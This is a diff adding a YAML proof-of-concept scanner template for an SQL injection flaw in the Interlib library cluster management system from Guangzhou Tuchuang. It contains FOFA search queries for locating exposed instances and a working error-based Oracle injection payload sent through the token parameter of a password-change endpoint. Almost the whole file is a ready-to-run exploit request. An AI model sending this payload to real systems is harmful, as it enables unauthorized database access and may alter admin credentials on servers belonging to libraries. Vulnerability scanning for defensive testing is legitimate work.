@@ -1,0 +1,24 @@
+id: poc-yaml-guangzhou-tuchuang-updopuserpw-sqli
+info:
+  name: 广州图创 图书馆集群管理系统 updOpuserPw SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 图书馆集群管理系统
+  fofa: body="Interlib图书馆集群管理系统" || body="/interlib3/system_index" || body="打开Interlib主界面"
+variables:
+  t1: random_int(1000,10000)
+  t2: t1 * 111
+requests:
+- method: GET
+  path: /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%20{{.t1}}*111%20from%20dual))=%272
+  expression: 'status_code == 200 &&
+
+    contains(body,"java.sql.SQLException") &&
+
+    contains(body,"Oracle Text") &&
+
+    contains(body,t2)
+
+    '
+transport: http
